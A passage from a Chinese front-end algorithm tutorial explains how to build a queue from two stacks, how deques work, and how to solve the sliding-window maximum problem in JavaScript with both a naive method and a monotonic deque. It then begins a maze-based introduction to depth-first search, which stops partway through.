<p>以上考点中，1 属于基础难度， 2 对一部分同学来说已经有点吃力，3 的区分度最高——优先队列属于高级数据结构，其本质是二叉堆结构，考虑到相关题目具有较强的综合性，我们把它放在小册二叉树和堆相关的专题来展开。在本节，我们集中火力向前两个命题点开炮。</p>
<h2 data-id="heading-18">为什么一道题可以成为高频面试题</h2>
<p>如何用栈实现队列？这个问题在近几年的算法面试中热度非常高。</p>
<p>所谓“热度”从何而来？这里就引出了一个非常有趣的话题：（在前端算法面试中）<strong>什么样的题目是好题</strong>？</p>
<p>首先，不能剑走偏锋：好的面试题，它考察的大多是算法/数据结构中最经典、最关键的一部分内容，这样才能体现公平；其次，它的知识点要尽可能密集、题目本身要尽可能具备综合性，这样才能一箭双雕甚至一箭N雕，进而体现区分度、最大化面试过程的效率。</p>
<p>能够同时在这两个方面占尽优势的考题其实并不是很多，“<strong>用栈实现队列</strong>”这样的问题算是其中的佼佼者：一方面，它考察的确实是数据结构中的经典内容；另一方面，它又覆盖了两个大的知识点、足以检验出候选人编码基本功的扎实程度。唯一的 BUG 可能就是深度和复杂度不够，换句话说就是不够难。</p>
<p>这个特点，在普通算法面试中可能是 BUG，但在前端算法面试中，实在未必。大家要知道，你是前端，你的面试官也是前端，前端行业普遍的算法水平是啥样他心里还没个数吗...... 实际上大多数前端算法面试题的风格都是非常务实的，需要你炫技的实属特殊情况。</p>
<h2 data-id="heading-19">如何用栈实现一个队列？</h2>
<blockquote>
<p>题目描述：使用栈实现队列的下列操作：<br/>
push(x) -- 将一个元素放入队列的尾部。<br/>
pop() -- 从队列首部移除元素。<br/>
peek() -- 返回队列首部的元素。<br/>
empty() -- 返回队列是否为空。</p>
</blockquote>
<blockquote>
<p>示例:
MyQueue queue = new MyQueue();<br/>
queue.push(1);<br/>
queue.push(2);<br/>
queue.peek();  // 返回 1<br/>
queue.pop();   // 返回 1<br/>
queue.empty(); // 返回 false</p>
</blockquote>
<blockquote>
<p>说明:</p>
<ul>
<li>你只能使用标准的栈操作 -- 也就是只有 push to top, peek/pop from top, size, 和 is empty 操作是合法的。</li>
<li>你所使用的语言也许不支持栈。你可以使用 list 或者 deque（双端队列）来模拟一个栈，只要是标准的栈操作即可。</li>
<li>假设所有操作都是有效的 （例如，一个空的队列不会调用 pop 或者 peek 操作）。</li>
</ul>
</blockquote>
<h3 data-id="heading-20">思路分析</h3>
<p>做这道题大家首先要在心里清楚一个事情：栈和队列的区别在哪里？<br/>
仔细想想，栈，后进先出；队列，先进先出。也就是说两者的进出顺序其实是反过来的。用栈实现队列，说白了就是用栈实现先进先出的效果，再说直接点，就是想办法<strong>让栈底的元素首先被取出</strong>，也就是让出栈序列被<strong>逆序</strong>。<br/>
乍一看有点头大：栈结构决定了栈底元素只能被死死地压在最底下，如何使它首先被取出呢？<br/>
一个栈做不到的事情，我们用两个栈来做：</p>
<ul>
<li>首先，准备两个栈：</li>
</ul>
<p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/4/13/171735fc8ee608ea~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.awebp#?w=914&amp;h=722&amp;s=30040&amp;e=png" alt="" loading="lazy"/></p>
<ul>
<li>现在问题是，怎么把第一个栈底下的那个 1 给撬出来。仔细想想，阻碍我们接触到 1 的是啥？是不是它头上的 3 和 2？那么如何让 3 和 2 给 1 让路呢？实际上咱们完全可以把这三个元素按顺序从 stack1 中出栈、然后入栈到 stack 2 里去：</li>
</ul>
<p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/4/13/17173813ab3377b1~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.awebp#?w=894&amp;h=748&amp;s=30404&amp;e=png" alt="" loading="lazy"/></p>
<ul>
<li>此时 1 变得触手可及。不仅如此，下一次我们试图出队 2 的时候，可以继续直接对 stack2 执行出栈操作——因为转移 2 和 3 的时候已经做过一次逆序了，此时 stack2 的出栈序列刚好就对应队列的出队序列。</li>
<li>有同学会问，那如果 stack1 里入栈新元素怎么办？比如这样：<br/>
<img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/4/13/171738289370743a~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.awebp#?w=1010&amp;h=714&amp;s=37881&amp;e=png" alt="" loading="lazy"/></li>
</ul>
<p>你会发现这个4按照顺序应该在 1、2、3 后出栈。当 4 需要被出栈时，<code>stack2</code> 一定已经空掉了。当 <code>stack2</code> 为空、而 <code>stack1</code> 不为空时，我们需要继续把 <code>stack1</code> 中的元素转移到 <code>stack2</code> 中去，然后再从 <code>stack2</code> 里取元素。也就是说，所有的出队操作都只能依赖 <code>stack2</code> 来完成——只要我们坚持这个原则，就可以确保 <code>stack1</code> 里的元素都能够按照正确的顺序（逆序）出栈。</p>
<p>我们按照这个思路来写代码：</p>
<h3 data-id="heading-21">编码实现</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">/**
 * 初始化构造函数
 */</span>
<span class="hljs-keyword">const</span> <span class="hljs-title class_">MyQueue</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
  <span class="hljs-comment">// 初始化两个栈</span>
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">stack1</span> = [];
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">stack2</span> = [];
};

<span class="hljs-comment">/**
* Push element x to the back of queue.
* <span class="hljs-doctag">@param</span> {<span class="hljs-type">number</span>} <span class="hljs-variable">x</span>
* <span class="hljs-doctag">@return</span> {<span class="hljs-type">void</span>}
*/</span>
<span class="hljs-title class_">MyQueue</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">push</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">x</span>) {
  <span class="hljs-comment">// 直接调度数组的 push 方法</span>
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">stack1</span>.<span class="hljs-title function_">push</span>(x);
};

<span class="hljs-comment">/**
* Removes the element from in front of queue and returns that element.
* <span class="hljs-doctag">@return</span> {<span class="hljs-type">number</span>}
*/</span>
<span class="hljs-title class_">MyQueue</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">pop</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
  <span class="hljs-comment">// 假如 stack2 为空，需要将 stack1 的元素转移进来</span>
  <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">stack2</span>.<span class="hljs-property">length</span> &lt;= <span class="hljs-number">0</span>) {
    <span class="hljs-comment">// 当 stack1 不为空时，出栈</span>
    <span class="hljs-keyword">while</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">stack1</span>.<span class="hljs-property">length</span> !== <span class="hljs-number">0</span>) {
      <span class="hljs-comment">// 将 stack1 出栈的元素推入 stack2</span>
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">stack2</span>.<span class="hljs-title function_">push</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">stack1</span>.<span class="hljs-title function_">pop</span>());
    }
  }
  <span class="hljs-comment">// 为了达到逆序的目的，我们只从 stack2 里出栈元素</span>
  <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">stack2</span>.<span class="hljs-title function_">pop</span>();
};

<span class="hljs-comment">/**
* Get the front element.
* <span class="hljs-doctag">@return</span> {<span class="hljs-type">number</span>}
* 这个方法和 pop 唯一的区别就是没有将定位到的值出栈
*/</span>
<span class="hljs-title class_">MyQueue</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">peek</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
  <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">stack2</span>.<span class="hljs-property">length</span> &lt;= <span class="hljs-number">0</span>) {
    <span class="hljs-comment">// 当 stack1 不为空时，出栈</span>
    <span class="hljs-keyword">while</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">stack1</span>.<span class="hljs-property">length</span> != <span class="hljs-number">0</span>) {
      <span class="hljs-comment">// 将 stack1 出栈的元素推入 stack2</span>
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">stack2</span>.<span class="hljs-title function_">push</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">stack1</span>.<span class="hljs-title function_">pop</span>());
    }
  }
  <span class="hljs-comment">// 缓存 stack2 的长度</span>
  <span class="hljs-keyword">const</span> stack2Len = <span class="hljs-variable language_">this</span>.<span class="hljs-property">stack2</span>.<span class="hljs-property">length</span>;
  <span class="hljs-keyword">return</span> stack2Len &amp;&amp; <span class="hljs-variable language_">this</span>.<span class="hljs-property">stack2</span>[stack2Len - <span class="hljs-number">1</span>];
};

<span class="hljs-comment">/**
* Returns whether the queue is empty.
* <span class="hljs-doctag">@return</span> {<span class="hljs-type">boolean</span>}
*/</span>
<span class="hljs-title class_">MyQueue</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">empty</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
  <span class="hljs-comment">// 若 stack1 和 stack2 均为空，那么队列空</span>
  <span class="hljs-keyword">return</span> !<span class="hljs-variable language_">this</span>.<span class="hljs-property">stack1</span>.<span class="hljs-property">length</span> &amp;&amp; !<span class="hljs-variable language_">this</span>.<span class="hljs-property">stack2</span>.<span class="hljs-property">length</span>;
};
</code></pre>
<h2 data-id="heading-22">认识双端队列</h2>
<p>双端队列衍生出的滑动窗口问题，是一个经久不衰的命题热点。关于双端队列，各种各样的解释五花八门，这里大家不要纠结，就记住一句话：</p>
<p><strong>双端队列就是允许在队列的两端进行插入和删除的队列</strong>。</p>
<p>体现在编码上，最常见的载体是既允许使用 pop、push 同时又允许使用 shift、unshift 的数组：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> queue = [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>] <span class="hljs-comment">// 定义一个双端队列   </span>
queue.<span class="hljs-title function_">push</span>(<span class="hljs-number">1</span>) <span class="hljs-comment">// 双端队列尾部入队 </span>
queue.<span class="hljs-title function_">pop</span>() <span class="hljs-comment">// 双端队列尾部出队   </span>
queue.<span class="hljs-title function_">shift</span>() <span class="hljs-comment">// 双端队列头部出队 </span>
queue.<span class="hljs-title function_">unshift</span>(<span class="hljs-number">1</span>) <span class="hljs-comment">// 双端队列头部入队</span>
</code></pre>
<p>现在相信你对双端队列已经形成了一个感性的认知，咱们紧接着就开始做题，在题里去认知这种结构的特征和效用。</p>
<h2 data-id="heading-23">滑动窗口问题</h2>
<blockquote>
<p>题目描述：给定一个数组 nums 和滑动窗口的大小 k，请找出所有滑动窗口里的最大值。</p>
</blockquote>
<blockquote>
<p>示例:
输入: nums = [1,3,-1,-3,5,3,6,7], 和 k = 3
输出: [3,3,5,5,6,7]</p>
</blockquote>
<blockquote>
<p>解释:  滑动窗口的位置<br/>
---------------<br/>
[1  3  -1] -3  5  3  6  7<br/>
1 [3  -1  -3] 5  3  6  7<br/>
1  3 [-1  -3  5] 3  6  7<br/>
1  3  -1 [-3  5  3] 6  7<br/>
1  3  -1  -3 [5  3  6] 7<br/>
1  3  -1  -3  5 [3  6  7]</p>
</blockquote>
<blockquote>
<p>最大值分别对应：<br/>
3
3
5
5
6
7</p>
</blockquote>
<blockquote>
<p>提示：你可以假设 k 总是有效的，在输入数组不为空的情况下，1 ≤ k ≤ 输入数组的大小。</p>
</blockquote>
<h3 data-id="heading-24">思路分析：双指针+遍历法</h3>
<p>这道题如果只是为了做对，那么思路其实不难想，我们直接模拟题中描述的这个过程就行。<br/>
按照题意，它要求我们在遍历数组的过程当中，约束一个窗口——窗口的本质其实就是一个范围，像这样：</p>
<pre><code class="hljs language-csharp" lang="csharp">[<span class="hljs-meta">1  3  -1</span>] <span class="hljs-number">-3</span>  <span class="hljs-number">5</span>  <span class="hljs-number">3</span>  <span class="hljs-number">6</span>  <span class="hljs-number">7</span> 
</code></pre>
<p>范围就被圈定在了前三个元素。<br/>
我们前面学过，约束范围，可以用双指针。因此我这里定义一个 <code>left</code> 左指针、定义一个 <code>right</code> 右指针，分别指向窗口的两端即可：</p>
<p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/4/19/171915c3ae13a951~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.awebp#?w=1252&amp;h=452&amp;s=27612&amp;e=png" alt="" loading="lazy"/>
接下来我们可以把这个窗口里的数字取出来，直接遍历一遍、求出最大值，然后把最大值存进结果数组。这样第一个窗口的最大值就有了。</p>
<p>接着按照题意，窗口每次前进一步（左右指针每次一起往前走一步），此时的范围变成了这样：</p>
<p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/4/19/171915c9c9f694db~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.awebp#?w=1238&amp;h=462&amp;s=27669&amp;e=png&amp;b=ffffff" alt="" loading="lazy"/>
我们要做的仍然是取出当前范围的所有元素、遍历一遍求出最大值，然后将最大值存进结果数组。</p>
<p>反复执行上面这个过程，直到数组完全被滑动窗口遍历完毕，我们也就得到了问题的答案。</p>
<p>基于这个淳朴的思路，我们来写一波代码：</p>
<h3 data-id="heading-25">编码实现：双指针+遍历法</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">/**
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">number[]</span>} <span class="hljs-variable">nums</span>
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">number</span>} <span class="hljs-variable">k</span>
 * <span class="hljs-doctag">@return</span> {<span class="hljs-type">number[]</span>}
 */</span>
<span class="hljs-keyword">const</span> maxSlidingWindow = <span class="hljs-keyword">function</span> (<span class="hljs-params">nums, k</span>) {
  <span class="hljs-comment">// 缓存数组的长度</span>
  <span class="hljs-keyword">const</span> len = nums.<span class="hljs-property">length</span>;
  <span class="hljs-comment">// 定义结果数组</span>
  <span class="hljs-keyword">const</span> res = [];
  <span class="hljs-comment">// 初始化左指针</span>
  <span class="hljs-keyword">let</span> left = <span class="hljs-number">0</span>;
  <span class="hljs-comment">// 初始化右指针</span>
  <span class="hljs-keyword">let</span> right = k - <span class="hljs-number">1</span>;
  <span class="hljs-comment">// 当数组没有被遍历完时，执行循环体内的逻辑</span>
  <span class="hljs-keyword">while</span> (right &lt; len) {
    <span class="hljs-comment">// 计算当前窗口内的最大值</span>
    <span class="hljs-keyword">const</span> max = <span class="hljs-title function_">calMax</span>(nums, left, right);
    <span class="hljs-comment">// 将最大值推入结果数组</span>
    res.<span class="hljs-title function_">push</span>(max);
    <span class="hljs-comment">// 左指针前进一步</span>
    left++;
    <span class="hljs-comment">// 右指针前进一步</span>
    right++;
  }
  <span class="hljs-comment">// 返回结果数组</span>
  <span class="hljs-keyword">return</span> res;
};

<span class="hljs-comment">// 这个函数用来计算最大值</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">calMax</span>(<span class="hljs-params">arr, left, right</span>) {
  <span class="hljs-comment">// 处理数组为空的边界情况</span>
  <span class="hljs-keyword">if</span> (!arr || !arr.<span class="hljs-property">length</span>) {
    <span class="hljs-keyword">return</span>;
  }
  <span class="hljs-comment">// 初始化 maxNum 的值为窗口内第一个元素</span>
  <span class="hljs-keyword">let</span> maxNum = arr[left];
  <span class="hljs-comment">// 遍历窗口内所有元素，更新 maxNum 的值</span>
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = left; i &lt;= right; i++) {
    <span class="hljs-keyword">if</span> (arr[i] &gt; maxNum) {
      maxNum = arr[i];
    }
  }
  <span class="hljs-comment">// 返回最大值</span>
  <span class="hljs-keyword">return</span> maxNum;
}
</code></pre>
<h3 data-id="heading-26">解法复盘</h3>
<p>上面这个解法，你在面试的时候写上去，完全没有问题，也不用担心超时。<br/>
有的同学可能会觉得 <code>calMax</code> 这个函数多余了，认为可以直接用 <code>Math.max</code> 这个 JS 原生方法。其实就算是<code>Math.max</code>，也不可避免地需要对你传入的多个数字做最小值查找，<code>calMax</code> 和<code>Math.max</code>做的工作可以说是一样的辛苦。我这里手动实现一个 <code>calMax</code>， 大家会对查找过程造成的时间开销有更直观的感知。</p>
<p>现在我们来思考一下，上面这一波操作下来，时间复杂度是多少？<br/>
这波操作里其实涉及了两层循环，外层循环是 <code>while</code>，它和滑动窗口前进的次数有关。滑动窗口前进了多少次，<code>while</code> 就执行了多少次。</p>
<p>假设数组的规模是 <code>n</code>，那么从起始位置开始，滑动窗口每次走一步，一共可以走 <code>n - k </code> 次。注意别忘了初始位置也算作一步的，因此一共走了 <code>n - k + 1</code>次。然后每个窗口内部我们又会固定执行 <code>k</code> 次遍历。注意 <code>k</code> 可不是个常数，它和 <code>n</code> 一样是个变量。因此这个时间复杂度简化后用大 O 表示法可以记为 <code>O(kn)</code>。</p>
<p><code>O(kn)</code> 虽然不差，但对这道题来说，还不是最好。因此在面试过程中，如果你采用了上面这套解法做出了这个题，面试官有 99% 的可能性会追问你：这个题可以优化吗？如何优化？（或者直接问你，你能在线性时间复杂度内解决此题吗？）</p>
<p>答案当然是能，然后面试官就会搬个小板凳坐你旁边，看看你怎么妙手回春，变 <code>O(kn)</code> 为 <code>O(n)</code>。</p>
<p>接下来你需要表演的，正是面试官期待已久的双端队列解法啊！</p>
<h3 data-id="heading-27">思路分析：双端队列法</h3>
<p>要想变 <code>O(kn)</code> 为 <code>O(n)</code>，我们就要想怎么做才能丢掉这个 <code>k</code>。<br/>
<code>k</code> 之所以会产生，是因为我们现在只能通过遍历来更新最大值。那么更新最大值，有没有更高效的方法呢？<br/>
大家仔细想想，当滑动窗口往后前进一步的时候，比如我从初始位置前进到第二个位置：</p>
<p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/4/19/171916004417d924~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.awebp#?w=1218&amp;h=448&amp;s=27971&amp;e=png" alt="" loading="lazy"/>
（图中红色的范围是初始位置时，滑动窗口覆盖到的元素）</p>
<p>此时滑动窗口内的元素少了一个 1，增加了一个 -3——减少的数不是当前最大值，增加的数也没有超越当前最大值，因此最大值仍然是 3。此时我们不禁要想：如果我们能<strong>在窗口发生移动时，只根据发生变化的元素对最大值进行更新</strong>，那复杂度是不是就低很多了？</p>
<p>双端队列可以完美地帮助我们达到这个目的。</p>
<p>使用双端队列法，核心的思路是维护一个<strong>有效的递减队列</strong>。</p>
<p>在遍历数组的前期，我们尝试将遍历到的每一个元素都推入队列内部（下图是第一个元素入队的示意图）：</p>
<p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/4/19/171916b7462c1b87~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.awebp#?w=1242&amp;h=588&amp;s=35019&amp;e=png" alt="" loading="lazy"/>
每尝试推入一个元素前，都把这个元素与队列尾部的元素作对比。根据对比结果的不同，采取不同的措施：</p>
<ul>
<li>如果试图推入的元素（当前元素）大于队尾元素，则意味着队列的递减趋势被打破了。此时我们需要将队列尾部的元素依次出队（注意由于是双端队列，所以队尾出队是没有问题的）、直到队尾元素大于等于当前元素为止，此时再将当前元素入队。</li>
<li>如果试图推入的元素小于队列尾部的元素，那么就不需要额外的操作，直接把当前元素入队即可。</li>
</ul>
<p>我用动画来表达一下这个过程：</p>
<p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/4/19/171918a1ae330dd3~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.awebp#?w=1343&amp;h=799&amp;s=469027&amp;e=gif&amp;f=79&amp;b=fdfdfd" alt="" loading="lazy"/></p>
<p>（注：动画大小已经极致压缩，如果仍然存在加载失败问题，可能与网络环境有关。如果你遇到了这个问题，建议 PC 端点击<a href="https://link.juejin.cn?target=https%3A%2F%2Fp1-jj.byteimg.com%2Ftos-cn-i-t2oaga2asx%2Fgold-user-assets%2F2020%2F4%2F19%2F171918a1ae330dd3~tplv-t2oaga2asx-image.image" target="_blank" title="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/4/19/171918a1ae330dd3~tplv-t2oaga2asx-image.image" ref="nofollow noopener noreferrer">这里</a>直接访问动图试试看）</p>
<p>维持递减队列的目的，就在于<strong>确保队头元素始终是当前窗口的最大值</strong>。<br/>
当遍历到的元素个数达到了 <code>k</code> 个时，意味着滑动窗口的第一个最大值已经产生了，我们把它 push 进结果数组里：</p>
<p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/4/19/171916d956b7871b~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.awebp#?w=1232&amp;h=872&amp;s=59228&amp;e=png" alt="" loading="lazy"/></p>
<p>然后继续前进，我们发现数组索引 0 处的元素（<code>1</code>）已经被踢出滑动窗口了（图中红色方块对应的是当前滑动窗口覆盖到的元素们）：</p>
<p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/4/19/171916fec2ae69a2~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.awebp#?w=1184&amp;h=718&amp;s=46258&amp;e=png" alt="" loading="lazy"/>
为了确保<strong>队列的有效性</strong>，需要及时地去队列检查下 <code>1</code> 这个元素在不在队列里（在的话要及时地踢出去，因为队列本身只维护当前滑动窗口内的元素）。</p>
<p>这里大家思考一下，我在查找 <code>1</code> 的时候，需不需要遍历整个队列？答案是不需要，因为 <code>1</code> 是最靠前的一个元素，如果它在，那么它一定是队头元素。这里我们只需要检查队头元素是不是 <code>1</code> 就行了。 此时我们检查队头，发现是 <code>3</code>：</p>
<p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/4/19/17191713bc7336d2~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.awebp#?w=936&amp;h=184&amp;s=16471&amp;e=png" alt="" loading="lazy"/></p>
<p>没错，<code>1</code>早就因为不符合递减趋势被从队头干掉了。此时我们可以断定，当前双端队列里的元素都是滑动窗口已经覆盖的有效元素——没毛病，继续往下走就行了。</p>
<p>接下来，每往前遍历一个元素，都需要重复以上的几个步骤。这里我总结一下每一步都做了什么：</p>
<ol>
<li>检查队尾元素，看是不是都满足大于等于当前元素的条件。如果是的话，直接将当前元素入队。否则，将队尾元素逐个出队、直到队尾元素大于等于当前元素为止。</li>
<li>将当前元素入队</li>
<li>检查队头元素，看队头元素是否已经被排除在滑动窗口的范围之外了。如果是，则将队头元素出队。</li>
<li>判断滑动窗口的状态：看当前遍历过的元素个数是否小于 <code>k</code>。如果元素个数小于<code>k</code>，这意味着第一个滑动窗口内的元素都还没遍历完、第一个最大值还没出现，此时我们还不能动结果数组，只能继续更新队列；如果元素个数大于等于<code>k</code>，这意味着滑动窗口的最大值已经出现了，此时每遍历到一个新元素（也就是滑动窗口每往前走一步）都要及时地往结果数组里添加当前滑动窗口对应的最大值（最大值就是此时此刻双端队列的队头元素）。</li>
</ol>
<p>这四个步骤分别有以下的目的：</p>
<ol>
<li>维持队列的<strong>递减性</strong>：确保队头元素是当前滑动窗口的最大值。这样我们每次取最大值时，直接取队头元素即可。</li>
<li>这一步没啥好说的，就是在维持队列递减性的基础上、更新队列的内容。</li>
<li>维持队列的<strong>有效性</strong>：确保队列里所有的元素都在滑动窗口圈定的范围以内。</li>
<li>排除掉滑动窗口还没有初始化完成、第一个最大值还没有出现的特殊情况。</li>
</ol>
<p>结合以上的分析，我们来写代码：</p>
<h3 data-id="heading-28">编码实现</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">/**
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">number[]</span>} <span class="hljs-variable">nums</span>
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">number</span>} <span class="hljs-variable">k</span>
 * <span class="hljs-doctag">@return</span> {<span class="hljs-type">number[]</span>}
 */</span>
<span class="hljs-keyword">const</span> maxSlidingWindow = <span class="hljs-keyword">function</span> (<span class="hljs-params">nums, k</span>) {
  <span class="hljs-comment">// 缓存数组的长度</span>
  <span class="hljs-keyword">const</span> len = nums.<span class="hljs-property">length</span>;
  <span class="hljs-comment">// 初始化结果数组</span>
  <span class="hljs-keyword">const</span> res = [];
  <span class="hljs-comment">// 初始化双端队列</span>
  <span class="hljs-keyword">const</span> deque = [];
  <span class="hljs-comment">// 开始遍历数组</span>
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; len; i++) {
    <span class="hljs-comment">// 当队尾元素小于当前元素时</span>
    <span class="hljs-keyword">while</span> (deque.<span class="hljs-property">length</span> &amp;&amp; nums[deque[deque.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>]] &lt; nums[i]) {
      <span class="hljs-comment">// 将队尾元素（索引）不断出队，直至队尾元素大于等于当前元素</span>
      deque.<span class="hljs-title function_">pop</span>();
    }
    <span class="hljs-comment">// 入队当前元素索引（注意是索引）</span>
    deque.<span class="hljs-title function_">push</span>(i);
    <span class="hljs-comment">// 当队头元素的索引已经被排除在滑动窗口之外时</span>
    <span class="hljs-keyword">while</span> (deque.<span class="hljs-property">length</span> &amp;&amp; deque[<span class="hljs-number">0</span>] &lt;= i - k) {
      <span class="hljs-comment">// 将队头元素索引出队</span>
      deque.<span class="hljs-title function_">shift</span>();
    }
    <span class="hljs-comment">// 判断滑动窗口的状态，只有在被遍历的元素个数大于 k 的时候，才更新结果数组</span>
    <span class="hljs-keyword">if</span> (i &gt;= k - <span class="hljs-number">1</span>) {
      res.<span class="hljs-title function_">push</span>(nums[deque[<span class="hljs-number">0</span>]]);
    }
  }
  <span class="hljs-comment">// 返回结果数组</span>
  <span class="hljs-keyword">return</span> res;
};
</code></pre>
<p>（阅读过程中有任何想法或疑问，或者单纯希望和笔者交个朋友啥的，欢迎大家添加我的微信xyalinode与我交流哈~）</p>
<p>本节我们学习两种关键的基本算法思想：DFS（深度优先搜索）和BFS（广度优先搜索）。这两种算法和栈、队列有着千丝万缕的关系，如果前两节你认真学习掌握了，那么这一节对你来说相信不是问题。</p>
<h2 data-id="heading-29">深度优先搜索思想：不撞南墙不回头的“迷宫游戏”</h2>
<p>20世纪90年代，小霸王学习机风靡全国。没有哪个小学生，不想拥有一台自己的小霸王学习机——我，也不例外；没有哪个小学生在拥有了小霸王学习机之后，会真的用它来搞学习——我，也不例外。在那个没有王者也没有吃鸡的年代里，小霸王里让我欲罢不能的除了魂斗罗、超级玛丽，还有它——迷宫游戏：</p>
<p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/4/18/1718da594ad8bc44~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.awebp#?w=1528&amp;h=1032&amp;s=114394&amp;e=jpg" alt="" loading="lazy"/></p>
<p>很多同学跟我说他入门算法的时候就挂在 DFS 这里，觉得太高深了，学不动。傻孩子，今天你就会知道，深度优先搜索也不过是在用编码的方式玩一场迷宫游戏。</p>
<p>现在把图上的小黄点想象成你自己，由于你手里没有地图、没有无人机，因此你对迷宫整体的地形一无所知。放眼望去，你眼前只有冰冷的墙壁和并不知道能不能走通的道路。如何走出一条通路？你只能尝试把每一条能走的路都走一遍——也就是所谓的“穷举法”：</p>
<ul>
<li>以当前位置为起点，闷头往前走</li>
<li>在前进的过程中，难免会遇到岔路口。这个路口可能分叉出去两条、三条、四条甚至更多的道路，你只能选择其中的一条路、然后继续前进（注意，你可能会不止一次遇到岔路口；每遇到一个新的岔路口，你都需要做一次选择）。</li>
<li>你选择的这条路未必是一条通路。如果你走到最后发现此路不通，那么你就要退回到离你最近的那个分叉路口，然后尝试看其它的岔路能不能走通。如果当前的岔路口分叉出去的所有道路都走不通，那么就需要退回到当前岔路口的上一个岔路口，进一步去寻找新的路径。</li>
</ul>
<p>按照这个思路走下去，只要迷宫是有出口的，你就一定能找到这个出口。在这个过程里，<strong>我们贯彻了“不撞南墙不回头”的原则：只要没有碰壁，就决不选择其它的道路，而是坚持向当前道路的深处挖掘——像这样将“深度”作为前进的第一要素的搜索方法，就是所谓的“深度优先搜索”</strong>。</p>
<p><strong>深度优先搜索的核心思想，是试图穷举所有的完整路径</strong>。</p>
<h2 data-id="heading-30">深度优先搜索的本质——栈结构</h2>
<p>那么如何使用编码来实现深度优先搜索呢？我们继续讨论迷宫问题，这里我给大家一个抽象过后的简单迷宫结构：</p>
<p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/4/18/1718dd0887578d3d~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.awebp#?w=1098&amp;h=636&amp;s=66802&amp;e=png&amp;b=ffffff" alt="" loading="lazy"/></p>
<p>图中蓝色的是入口，灰色的是岔路口，黑色的是死胡同，绿色的是出口。</p>
<p>基于眼前的这个迷宫结构，我们来一步一步模拟一下深度优先搜索的具体过程：</p>
<ol>
<li>从 <code>A</code> 出发，沿着唯一的一条道路往下走，遇到了第1个岔路口<code>B</code>。眼前有三个选择：<code>C</code>、<code>D</code>、<code>E</code>。这里我按照从上到下的顺序来走（你也可以按照其它顺序），先走<code>C</code>。</li>
<li>发现 <code>C</code>是死胡同，后退到最近的岔路口 <code>B</code>，尝试往<code>D</code>方向走。</li>
<li>发现<code>D</code> 是死胡同，，后退到最近的岔路口 <code>B</code>，尝试往<code>E</code>方向走。</li>
<li><code>E</code> 是一个岔路口，眼前有两个选择：<code>F</code> 和 <code>G</code>。按照从上到下的顺序来走，先走<code>F</code>。</li>
